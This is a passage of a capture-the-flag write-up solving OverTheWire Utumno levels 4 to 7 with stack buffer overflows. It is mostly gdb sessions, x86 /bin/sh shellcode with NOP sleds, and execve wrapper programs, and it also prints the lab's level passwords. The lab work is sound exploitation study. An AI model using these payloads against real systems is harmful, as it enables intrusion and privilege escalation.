After a few try, you should be able to get control over the return address:

```nasm
utumno4@utumno:/utumno$ gdb -q ./utumno4
Reading symbols from ./utumno4...done.
(gdb) set disassembly-flavor intel
(gdb) run 65536 $(python -c "print 'A' * 65536")
Starting program: /utumno/utumno4 65536 $(python -c "print 'A' * 65536")

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) run 65536 $(python -c "print 'A' * 65286 + 'BBBB' + 'C' * 246")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /utumno/utumno4 65536 $(python -c "print 'A' * 65286 + 'BBBB' + 'C' * 246")

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```

Now, we load a shellcode and find a proper return address on the NOP Sled:

```nasm
(gdb) run 65536 $(python -c "print '\x90' * 65265 + '\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80' + 'BBBB' + '\x90' * 246")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /utumno/utumno4 65536 $(python -c "print '\x90' * 65265 + '\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80' + 'BBBB' + '\x90' * 246")

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) x/300x $esp-300
0xfffed564:	0x90909090	0x90909090	0x90909090	0x90909090
0xfffed574:	0x90909090	0x90909090	0x90909090	0x90909090
0xfffed584:	0x90909090	0x90909090	0x90909090	0x90909090
0xfffed594:	0x90909090	0x90909090	0x90909090	0x90909090
0xfffed5a4:	0x90909090	0x90909090	0x90909090	0x90909090
0xfffed5b4:	0x90909090	0x90909090	0x90909090	0x90909090
0xfffed5c4:	0x90909090	0x90909090	0x90909090	0x90909090
0xfffed5d4:	0x90909090	0x90909090	0x90909090	0x90909090
0xfffed5e4:	0x90909090	0x90909090	0x90909090	0x90909090
0xfffed5f4:	0x90909090	0x90909090	0x90909090	0x90909090
0xfffed604:	0x90909090	0x90909090	0x90909090	0x90909090
0xfffed614:	0x90909090	0x90909090	0x90909090	0x90909090
0xfffed624:	0x90909090	0x90909090	0x90909090	0x90909090
0xfffed634:	0x90909090	0x90909090	0x90909090	0x90909090
0xfffed644:	0x90909090	0x90909090	0x90909090	0x90909090
0xfffed654:	0x90909090	0x90909090	0x90909090	0x90909090
0xfffed664:	0x90909090	0x90909090	0x90909090	0x90909090
0xfffed674:	0x31909090	0xb0e1f7c9	0x2f68510b	0x6868732f
0xfffed684:	0x6e69622f	0x80cde389	0x42424242	0x90909090
0xfffed694:	0x90909090	0x90909090	0x90909090	0x90909090
0xfffed6a4:	0x90909090	0x90909090	0x90909090	0x90909090
0xfffed6b4:	0x90909090	0x90909090	0x90909090	0x90909090
0xfffed6c4:	0x90909090	0x90909090	0x90909090	0x90909090
0xfffed6d4:	0x90909090	0x90909090	0x90909090	0x90909090
```

Here I used `0xfffed660`. I also added some NOP **after** the shellcode as I had some issue running the shellcode.

```nasm
utumno4@utumno:/utumno$ ./utumno4 65536 $(python -c "print '\x90' * 65257 + '\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80' + 8 * '\x90' + '\x60\xd6\xfe\xff' + 'C' * 246")
$ whoami
utumno5
$ cat /etc/utumno_pass/utumno5
woucaejiek
```

Easy !

## Решение Utumno 05

**SSH :** *ssh utumno5@utumno.labs.overthewire.org -p 2227*<br/>
**Pass :** *woucaejiek*

As usual, let's take a look at the code...

```nasm
$ gdb -q ./utumno5
Reading symbols from ./utumno5...done.
(gdb) set disassembly-flavor intel
(gdb) set disassemble-next-line on
(gdb) disas main
Dump of assembler code for function main:
   0x08048516 <+0>:	push   ebp
   0x08048517 <+1>:	mov    ebp,esp
   0x08048519 <+3>:	cmp    DWORD PTR [ebp+0x8],0x0
   0x0804851d <+7>:	je     0x8048533 <main+29>
   0x0804851f <+9>:	push   0x80485f0
   0x08048524 <+14>:	call   0x8048380 <puts@plt>
   0x08048529 <+19>:	add    esp,0x4
   0x0804852c <+22>:	push   0x1
   0x0804852e <+24>:	call   0x8048390 <exit@plt>
   0x08048533 <+29>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048536 <+32>:	add    eax,0x28
   0x08048539 <+35>:	mov    eax,DWORD PTR [eax]
   0x0804853b <+37>:	push   eax
   0x0804853c <+38>:	push   0x80485f5
   0x08048541 <+43>:	call   0x8048360 <printf@plt>
   0x08048546 <+48>:	add    esp,0x8
   0x08048549 <+51>:	mov    eax,DWORD PTR [ebp+0xc]
   0x0804854c <+54>:	add    eax,0x28
   0x0804854f <+57>:	mov    eax,DWORD PTR [eax]
   0x08048551 <+59>:	push   eax
   0x08048552 <+60>:	call   0x80484db <hihi>
   0x08048557 <+65>:	add    esp,0x4
   0x0804855a <+68>:	mov    eax,0x0
   0x0804855f <+73>:	leave
   0x08048560 <+74>:	ret
End of assembler dump.
(gdb) disas hihi
Dump of assembler code for function hihi:
   0x080484db <+0>:	push   ebp
   0x080484dc <+1>:	mov    ebp,esp
   0x080484de <+3>:	sub    esp,0xc
   0x080484e1 <+6>:	push   DWORD PTR [ebp+0x8]
   0x080484e4 <+9>:	call   0x80483a0 <strlen@plt>
   0x080484e9 <+14>:	add    esp,0x4
   0x080484ec <+17>:	cmp    eax,0x13
   0x080484ef <+20>:	jbe    0x8048504 <hihi+41>
   0x080484f1 <+22>:	push   0x14
   0x080484f3 <+24>:	push   DWORD PTR [ebp+0x8]
   0x080484f6 <+27>:	lea    eax,[ebp-0xc]
   0x080484f9 <+30>:	push   eax
   0x080484fa <+31>:	call   0x80483c0 <strncpy@plt>
   0x080484ff <+36>:	add    esp,0xc
   0x08048502 <+39>:	jmp    0x8048513 <hihi+56>
   0x08048504 <+41>:	push   DWORD PTR [ebp+0x8]
   0x08048507 <+44>:	lea    eax,[ebp-0xc]
   0x0804850a <+47>:	push   eax
   0x0804850b <+48>:	call   0x8048370 <strcpy@plt>
   0x08048510 <+53>:	add    esp,0x8
   0x08048513 <+56>:	nop
   0x08048514 <+57>:	leave
   0x08048515 <+58>:	ret
End of assembler dump.
(gdb)
```

This challenge is quite similar to the second one as we need to have no args passed to the executable. We just need to reuse our old code to have an empty *argc*.

```c
#include <unistd.h>

void main() {
    execve("/utumno/utumno5", NULL, NULL);
}
```

```bash
utumno5@utumno:/tmp/ax$ gcc -m32 code.c -o code
utumno5@utumno:/tmp/ax$ ltrace ./code
__libc_start_main(0x565555a0, 1, 0xffffd764, 0x565555e0 <unfinished ...>
execve(0x56555660, 0, 0, 0x565555b4 <no return ...>
--- Called exec() ---
__libc_start_main(0x8048516, 0, 0xffffdf14, 0x8048570 <unfinished ...>
printf("Here we go - %s\n", "\021\022\023\024\025\026\027\030\031\032\033\034\035\036\037 !"#$%&'()*+,-./0"... <no return ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```

Hum, *segfault*... Let's add some environment variables.

```c
#include <unistd.h>

void main() {
    char *envp[] = {"A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L"};
    execve("/utumno/utumno5", NULL, envp);
}
```

```bash
utumno5@utumno:/tmp/ax$ gcc -m32 code.c -o code
utumno5@utumno:/tmp/ax$ ltrace ./code
__libc_start_main(0x565555a0, 1, 0xffffd764, 0x56555660 <unfinished ...>
execve(0x565556f8, 0, 0xffffd680, 0x565555b7 <no return ...>
--- Called exec() ---
__libc_start_main(0x8048516, 0, 0xffffdec4, 0x8048570 <unfinished ...>
printf("Here we go - %s\n", "J"Here we go - J
)                             = 15
strlen("J")                                                  = 1
strcpy(0xffffde10, "J")                                      = 0xffffde10
+++ exited (status 0) +++
```

Interesting... the 10th argument is printed. Let's try to overflow this variable.

```c
#include <unistd.h>

void main() {
    char *envp[] = {"", "", "", "", "", "", "", "", "", "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIII"};
    execve("/utumno/utumno5", NULL, envp);
}
```

```bash
utumno5@utumno:/tmp/ax$ strace ./code
execve("./code", ["./code"], [/* 20 vars */]) = 0
strace: [ Process PID=16264 runs in 32 bit mode. ]
brk(NULL)                               = 0x56558000

...[removed]...

fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 1), ...}) = 0
brk(NULL)                               = 0x804a000
brk(0x806b000)                          = 0x806b000
write(1, "Here we go - AAAABBBBCCCCDDDDEEE"..., 50Here we go - AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIII
) = 50
--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x45454545} ---
+++ killed by SIGSEGV (core dumped) +++
Segmentation fault
```

Awesome, we overwrite the return address at EEEE. Let's add a shellcode in the 9th value and find a proper return value on the NOP sled.

```c
#include <unistd.h>

void main() {
    char *envp[] = {"", "", "", "", "", "", "", "", "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80", "AAAABBBBCCCCDDDDBBBB"};
    execve("/utumno/utumno5", NULL, envp);
}
```

```nasm
utumno5@utumno:/tmp/ax$ gdb -q ./code
Reading symbols from ./code...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb) run
Starting program: /tmp/ax/code
process 16279 is executing new program: /utumno/utumno5
Here we go - AAAABBBBCCCCDDDDEEEE

Program received signal SIGSEGV, Segmentation fault.
0x45454545 in ?? ()
(gdb) x/3000x $esp-3000
0xffffd22c:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd23c:	0x00000000	0x00000000	0x00000000	0x00000000

...[removed]...

0xffffdf3c:	0xffffdf6b	0x0000001a	0x00000000	0x0000001f
0xffffdf4c:	0xffffdfe8	0x0000000f	0xffffdf7b	0x00000000
0xffffdf5c:	0x00000000	0x00000000	0x00000000	0xfb000000
0xffffdf6c:	0x5c1f90e5	0xa999cdf6	0x51d9db57	0x695fa607
0xffffdf7c:	0x00363836	0x00000000	0x00000000	0x90909000
0xffffdf8c:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffdf9c:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffdfac:	0x90909090	0x90909090	0x90909090	0x31909090
0xffffdfbc:	0xb0e1f7c9	0x2f68510b	0x6868732f	0x6e69622f
0xffffdfcc:	0x80cde389	0x41414100	0x42424241	0x43434342
0xffffdfdc:	0x44444443	0x45454544	0x00010045	0x7574752f
0xffffdfec:	0x2f6f6e6d	0x6d757475	0x00356f6e	0x00000000
0xffffdffc:	0x00000000	Cannot access memory at address 0xffffe000
(gdb)
(gdb)
```

Here we could use `0xffffdf8c` as the return address.

```c
#include <unistd.h>

void main() {
    char *envp[] = {"", "", "", "", "", "", "", "", "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80", "AAAABBBBCCCCDDDD\x8c\xdf\xff\xff"};
    execve("/utumno/utumno5", NULL, envp);
}
```

Now, we can compile our code and get the shell !

```nasm
utumno5@utumno:/tmp/ax$ gcc -m32 code.c -o code
utumno5@utumno:/tmp/ax$ ./code
Here we go - AAAABBBBCCCCDDDD����
$ whoami
utumno6
$ cat /etc/utumno_pass/utumno6
eiluquieth
```

Done !

## Решение Utumno 06

**SSH :** *ssh utumno6@utumno.labs.overthewire.org -p 2227*<br/>
**Pass :** *eiluquieth*

Ok, first we'll check if this executable needs some args.

```bash
utumno6@utumno:/utumno$ ./utumno6
Missing args
utumno6@utumno:/utumno$ ./utumno6 1
Missing args
utumno6@utumno:/utumno$ ./utumno6 1 2
Segmentation fault
utumno6@utumno:/utumno$ ./utumno6 1 2 3
Table position 1 has value 2
Description: 3
```

It looks like some kind of key-value storage. The first argument is the *position* in the table, the second is the *value* itself and the third is a *description* of the value.

```nasm
utumno6@utumno:/utumno$ gdb -q ./utumno6
Reading symbols from ./utumno6...done.
(gdb) set disassembly-flavor intel
(gdb) disas main
Dump of assembler code for function main:
   0x080484db <+0>:	push   ebp
   0x080484dc <+1>:	mov    ebp,esp
   0x080484de <+3>:	sub    esp,0x34
   0x080484e1 <+6>:	cmp    DWORD PTR [ebp+0x8],0x2 ; check if at least 2 args are present
   0x080484e5 <+10>:	jg     0x80484fb <main+32>
   0x080484e7 <+12>:	push   0x8048630
   0x080484ec <+17>:	call   0x8048390 <puts@plt>
   0x080484f1 <+22>:	add    esp,0x4
   0x080484f4 <+25>:	push   0x1
   0x080484f6 <+27>:	call   0x80483a0 <exit@plt>
   0x080484fb <+32>:	push   0x20
   0x080484fd <+34>:	call   0x8048380 <malloc@plt>
   0x08048502 <+39>:	add    esp,0x4
   0x08048505 <+42>:	mov    DWORD PTR [ebp-0x34],eax
   0x08048508 <+45>:	mov    eax,DWORD PTR [ebp-0x34]
   0x0804850b <+48>:	test   eax,eax
   0x0804850d <+50>:	jne    0x8048523 <main+72>
   0x0804850f <+52>:	push   0x804863d
   0x08048514 <+57>:	call   0x8048390 <puts@plt>
   0x08048519 <+62>:	add    esp,0x4
   0x0804851c <+65>:	push   0x1
   0x0804851e <+67>:	call   0x80483a0 <exit@plt>
   0x08048523 <+72>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048526 <+75>:	add    eax,0x8
   0x08048529 <+78>:	mov    eax,DWORD PTR [eax]
   0x0804852b <+80>:	push   0x10
   0x0804852d <+82>:	push   0x0
   0x0804852f <+84>:	push   eax
   0x08048530 <+85>:	call   0x80483b0 <strtoul@plt> ; convert the second value to int base16
   0x08048535 <+90>:	add    esp,0xc
   0x08048538 <+93>:	mov    DWORD PTR [ebp-0x4],eax
   0x0804853b <+96>:	mov    eax,DWORD PTR [ebp+0xc]
   0x0804853e <+99>:	add    eax,0x4
   0x08048541 <+102>:	mov    eax,DWORD PTR [eax]
   0x08048543 <+104>:	push   0xa
   0x08048545 <+106>:	push   0x0
   0x08048547 <+108>:	push   eax
   0x08048548 <+109>:	call   0x80483b0 <strtoul@plt> ; convert the first value to int base10
   0x0804854d <+114>:	add    esp,0xc
   0x08048550 <+117>:	mov    DWORD PTR [ebp-0x8],eax
   0x08048553 <+120>:	cmp    DWORD PTR [ebp-0x8],0xa
   0x08048557 <+124>:	jle    0x804856d <main+146>
   0x08048559 <+126>:	push   0x804865c
   0x0804855e <+131>:	call   0x8048390 <puts@plt>
   0x08048563 <+136>:	add    esp,0x4
   0x08048566 <+139>:	push   0x1
   0x08048568 <+141>:	call   0x80483a0 <exit@plt>
   0x0804856d <+146>:	mov    eax,DWORD PTR [ebp-0x8]
   0x08048570 <+149>:	mov    edx,DWORD PTR [ebp-0x4]
   0x08048573 <+152>:	mov    DWORD PTR [ebp+eax*4-0x30],edx
   0x08048577 <+156>:	mov    eax,DWORD PTR [ebp+0xc]
   0x0804857a <+159>:	add    eax,0xc
   0x0804857d <+162>:	mov    edx,DWORD PTR [eax]
   0x0804857f <+164>:	mov    eax,DWORD PTR [ebp-0x34]
   0x08048582 <+167>:	push   edx
   0x08048583 <+168>:	push   eax
   0x08048584 <+169>:	call   0x8048370 <strcpy@plt>
   0x08048589 <+174>:	add    esp,0x8
   0x0804858c <+177>:	mov    edx,DWORD PTR [ebp-0x34]
   0x0804858f <+180>:	mov    eax,DWORD PTR [ebp-0x8]
   0x08048592 <+183>:	mov    eax,DWORD PTR [ebp+eax*4-0x30]
   0x08048596 <+187>:	push   edx
   0x08048597 <+188>:	push   eax
   0x08048598 <+189>:	push   DWORD PTR [ebp-0x8]
   0x0804859b <+192>:	push   0x8048684
   0x080485a0 <+197>:	call   0x8048360 <printf@plt>
   0x080485a5 <+202>:	add    esp,0x10
   0x080485a8 <+205>:	mov    eax,0x0
   0x080485ad <+210>:	leave
   0x080485ae <+211>:	ret
End of assembler dump.
```

It seems that the code do some convertion on the args. The first arg is converted to **base10**, the second to **base16** and the third is a **string**.

```bash
utumno6@utumno:/utumno$ ./utumno6 8 A foobar
Table position 8 has value 10
Description: foobar
```

After some test, I realised that by passing an invalid postion (**-1**) we can use the second argument as a return address.

```nasm
utumno6@utumno:/utumno$ strace ./utumno6 -1 0x41414141 foobar
execve("./utumno6", ["./utumno6", "-1", "0x41414141", "foobar"], [/* 20 vars */]) = 0
strace: [ Process PID=16355 runs in 32 bit mode. ]

...[removed]...

--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x41414141} ---
+++ killed by SIGSEGV +++
Segmentation fault
```

However, when we run it into **GDB** we get a different result :

```nasm
utumno6@utumno:/utumno$ gdb -q ./utumno6
Reading symbols from ./utumno6...done.
(gdb) set disassembly-flavor intel
(gdb) run -1 0x41414141 BBBB
Starting program: /utumno/utumno6 -1 0x41414141 BBBB

Program received signal SIGSEGV, Segmentation fault.
0xf7e998d2 in ?? () from /lib32/libc.so.6
```

So, I tried to take a valid value from the stack, the first one `0xffffd628`.

```nasm
(gdb) x/16x $esp
0xffffd628:	0x08048589	0x41414141	0xffffd869	0x41414141
0xffffd638:	0xf7e40890	0x080485fb	0x00000004	0xffffd704
0xffffd648:	0xffffd718	0x080485d1	0xf7fc53dc	0x0804822c
0xffffd658:	0x080485b9	0x00000000	0xffffffff	0x41414141
(gdb) run -1 0xffffd628 BBBB
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /utumno/utumno6 -1 0xffffd628 BBBB

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```

That's an interesting result. It seems that the second args can point to the third args and use it as a return address (I had to admit that it was a lucky shot). Now, we could create an environment variable with a shellcode and set the second argument to point to the third argument. The third argument will contains an address pointing to the NOP sled.

First, we export a shellcode with a generous NOP sled.

```bash
utumno6@utumno:/utumno$ export EGG=$(python -c "print 300 * '\x90' + '\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80'")
```

Now, based on our previous discovery, we will segfault the executable to get the address pointed by **ESP**.

```nasm
utumno6@utumno:/utumno$ gdb -q ./utumno6
Reading symbols from ./utumno6...done.
(gdb) set disassembly-flavor intel
(gdb) set disassemble-next-line on
(gdb) run -1 0xffffffff $(python -c "print 'BBBB'")
Starting program: /utumno/utumno6 -1 0xffffffff $(python -c "print 'BBBB'")

Program received signal SIGSEGV, Segmentation fault.
0xf7e998d2 in ?? () from /lib32/libc.so.6
=> 0xf7e998d2:	89 02	mov    DWORD PTR [edx],eax
(gdb) info reg esp
esp            0xffffd4e8	0xffffd4e8
(gdb) run -1 0xffffd4e8 $(python -c "print 'BBBB'")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /utumno/utumno6 -1 0xffffd4e8 $(python -c "print 'BBBB'")

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
=> 0x42424242:	Cannot access memory at address 0x42424242
(gdb)
```

Then we will try to find the address of our NOP sled and set it as third argument.

```nasm
gdb) x/2048x $esp
0xffffd4ec:	0xffffd400	0xffffd723	0xffffd4e8	0xf7e40890
0xffffd4fc:	0x080485fb	0x00000004	0xffffd5c4	0xffffd5d8

...[removed]...

0xffffdcec:	0x3d667073	0x333b3030	0x53003a36	0x435f4853
0xffffdcfc:	0x454e4e4f	0x4f495443	0x30313d4e	0x36312e34
0xffffdd0c:	0x36312e33	0x36382e39	0x37383520	0x31203337
0xffffdd1c:	0x312e3239	0x312e3836	0x392e3130	0x32322030
0xffffdd2c:	0x47474500	0x9090903d	0x90909090	0x90909090
0xffffdd3c:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffdd4c:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffdd5c:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffdd6c:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffdd7c:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffdd8c:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffdd9c:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffddac:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffddbc:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffddcc:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffdddc:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffddec:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffddfc:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffde0c:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffde1c:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffde2c:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffde3c:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffde4c:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffde5c:	0xf7c93190	0x510bb0e1	0x732f2f68	0x622f6868
0xffffde6c:	0xe3896e69	0x5f0080cd	0x73752f3d	0x69622f72
0xffffde7c:	0x64672f6e	0x414c0062	0x653d474e	0x53555f6e
0xffffde8c:	0x4654552e	0x4f00382d	0x5750444c	0x682f3d44
(gdb) run -1 0xffffd4e8 $(python -c "print '\xcc\xdd\xff\xff'")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /utumno/utumno6 -1 0xffffd4e8 $(python -c "print '\xcc\xdd\xff\xff'")
process 26560 is executing new program: /bin/dash
$
```

Finally, we try the same without **GDB**. I added 30 bytes to the second arguments to get a shell. Depending on your environment, try to increment it 10 by 10. Eventually you'll get the shell.

```bash
utumno6@utumno:/utumno$ ./utumno6 -1 0xffffd518 $(python -c "print '\xcc\xdd\xff\xff'")
$ whoami
utumno7
$ cat /etc/utumno_pass/utumno7
totiquegae
```

Done.

## Решение Utumno 07

**SSH :** *ssh utumno7@utumno.labs.overthewire.org -p 2227*<br/>
**Pass :** *totiquegae*

Let's disassemble each function of this challenge.

```nasm
utumno7@utumno:/utumno$ gdb -q ./utumno7
Reading symbols from ./utumno7...done.
(gdb) set disassembly-flavor intel
(gdb) disas main
Dump of assembler code for function main:
   0x08048501 <+0>:	push   ebp
   0x08048502 <+1>:	mov    ebp,esp
   0x08048504 <+3>:	cmp    DWORD PTR [ebp+0x8],0x1
   0x08048508 <+7>:	jg     0x8048511 <main+16>
   0x0804850a <+9>:	push   0x1
   0x0804850c <+11>:	call   0x8048380 <exit@plt>
   0x08048511 <+16>:	push   0x80485d0
   0x08048516 <+21>:	call   0x8048370 <puts@plt>
   0x0804851b <+26>:	add    esp,0x4
   0x0804851e <+29>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048521 <+32>:	add    eax,0x4
   0x08048524 <+35>:	mov    eax,DWORD PTR [eax]
   0x08048526 <+37>:	push   eax
   0x08048527 <+38>:	call   0x80484ab <vuln>
   0x0804852c <+43>:	add    esp,0x4
   0x0804852f <+46>:	mov    eax,0x0
   0x08048534 <+51>:	leave
   0x08048535 <+52>:	ret
End of assembler dump.
(gdb) disas vuln
Dump of assembler code for function vuln:
   0x080484ab <+0>:	push   ebp
   0x080484ac <+1>:	mov    ebp,esp
   0x080484ae <+3>:	sub    esp,0x120
   0x080484b4 <+9>:	mov    DWORD PTR [ebp-0x4],0x0
   0x080484bb <+16>:	lea    eax,[ebp-0xa0]
   0x080484c1 <+22>:	mov    ds:0x8049868,eax
   0x080484c6 <+27>:	lea    eax,[ebp-0xa0]
   0x080484cc <+33>:	push   eax
   0x080484cd <+34>:	call   0x8048350 <_setjmp@plt>
   0x080484d2 <+39>:	add    esp,0x4
   0x080484d5 <+42>:	mov    DWORD PTR [ebp-0x4],eax
   0x080484d8 <+45>:	cmp    DWORD PTR [ebp-0x4],0x0
   0x080484dc <+49>:	jne    0x80484fa <vuln+79>
   0x080484de <+51>:	push   DWORD PTR [ebp+0x8]
   0x080484e1 <+54>:	lea    eax,[ebp-0x120]
   0x080484e7 <+60>:	push   eax
   0x080484e8 <+61>:	call   0x8048360 <strcpy@plt>
   0x080484ed <+66>:	add    esp,0x8
   0x080484f0 <+69>:	push   0x17
   0x080484f2 <+71>:	call   0x8048536 <jmp>
   0x080484f7 <+76>:	add    esp,0x4
   0x080484fa <+79>:	mov    eax,0x0
   0x080484ff <+84>:	leave
   0x08048500 <+85>:	ret
End of assembler dump.
(gdb) disas _setjmp
Dump of assembler code for function _setjmp@plt:
   0x08048350 <+0>:	jmp    DWORD PTR ds:0x8049848
   0x08048356 <+6>:	push   0x8
   0x0804835b <+11>:	jmp    0x8048330
End of assembler dump.
(gdb) disas jmp
Dump of assembler code for function jmp:
   0x08048536 <+0>:	push   ebp
   0x08048537 <+1>:	mov    ebp,esp
   0x08048539 <+3>:	mov    eax,ds:0x8049868
   0x0804853e <+8>:	push   DWORD PTR [ebp+0x8]
   0x08048541 <+11>:	push   eax
   0x08048542 <+12>:	call   0x8048340 <longjmp@plt>
End of assembler dump.
```

Without reversing the logic of the code, after a few try, I was able to overflow the return address :

```nasm
utumno7@utumno:/utumno$ gdb -q ./utumno7
Reading symbols from ./utumno7...done.
(gdb) set disassembly-flavor intel
(gdb) set disassemble-next-line on
(gdb) run $(python -c 'print "A"*140')
Starting program: /utumno/utumno7 $(python -c 'print "A"*140')
lol ulrich && fuck hector

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
=> 0x41414141:	Cannot access memory at address 0x41414141
```

Then, by adding 4 bytes to the buffer. The code break somewhere at `vuln+42` :

```nasm
(gdb) set disassemble-next-line on
(gdb) run $(python -c 'print "A"*140 + "BBBB"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /utumno/utumno7 $(python -c 'print "A"*140 + "BBBB"')
lol ulrich && fuck hector

Program received signal SIGSEGV, Segmentation fault.
0x080484d5 in vuln (arg=<error reading variable: Cannot access memory at address 0x4242424a>)
    at utumno7.c:23
23	in utumno7.c
   0x080484c6 <vuln+27>:	8d 85 60 ff ff ff	lea    eax,[ebp-0xa0]
   0x080484cc <vuln+33>:	50	push   eax
   0x080484cd <vuln+34>:	e8 7e fe ff ff	call   0x8048350 <_setjmp@plt>
   0x080484d2 <vuln+39>:	83 c4 04	add    esp,0x4
=> 0x080484d5 <vuln+42>:	89 45 fc	mov    DWORD PTR [ebp-0x4],eax
```

By replacing **BBBB** with an address pointing to our buffer we get the control over the EIP :

```nasm
(gdb) run $(python -c 'print "A"*140 + "\xe4\xd7\xff\xff"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /utumno/utumno7 $(python -c 'print "A"*140 + "\xe4\xd7\xff\xff"')
lol ulrich && fuck hector

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
=> 0x41414141:	Cannot access memory at address 0x41414141
```

Afer a few try, I was able to properly control the return address :

```nasm
(gdb) run $(python -c "print 'AAAA' + 'BBBB' +  '\x90' * 132 + '\xdd\xd7\xff\xff'")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /utumno/utumno7 $(python -c "print 'AAAA' + 'BBBB' +  '\x90' * 132 + '\xdd\xd7\xff\xff'")
lol ulrich && fuck hector

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
=> 0x42424242:	Cannot access memory at address 0x42424242
```

Now we can place a standard **/bin/sh** shellcode and find a return address.

```nasm
utumno7@utumno:/utumno$ gdb -q ./utumno7
Reading symbols from ./utumno7...done.
(gdb) set disassembly-flavor intel
(gdb) set disassemble-next-line on
(gdb) run $(python -c "print 'AAAA' + 'BBBB' +  '\x90' * 111  + '\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80' + '\xdd\xd7\xff\xff'")
Starting program: /utumno/utumno7 $(python -c "print 'AAAA' + 'BBBB' +  '\x90' * 111  + '\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80' + '\xdd\xd7\xff\xff'")
lol ulrich && fuck hector

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
=> 0x42424242:	Cannot access memory at address 0x42424242
(gdb) x/512x $esp-500
0xffffd5f1:	0xdd080485	0x00ffffd7	0x86000000	0x02f7e2a2

...[removed]...

0xffffd7c1:	0x00000000	0x00000000	0x00000000	0x7574752f
0xffffd7d1:	0x2f6f6e6d	0x6d757475	0x00000017	0x41414141
0xffffd7e1:	0x42424242	0x90909090	0x90909090	0x90909090
0xffffd7f1:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd801:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd811:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd821:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd831:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd841:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd851:	0x31909090	0xb0e1f7c9	0x2f68510b	0x6868732f
0xffffd861:	0x6e69622f	0x80cde389	0xffffd7dd	0x5f434c00
0xffffd871:	0x3d4c4c41	0x555f6e65	0x54552e53	0x00382d46
0xffffd881:	0x435f534c	0x524f4c4f	0x73723d53	0x643a303d
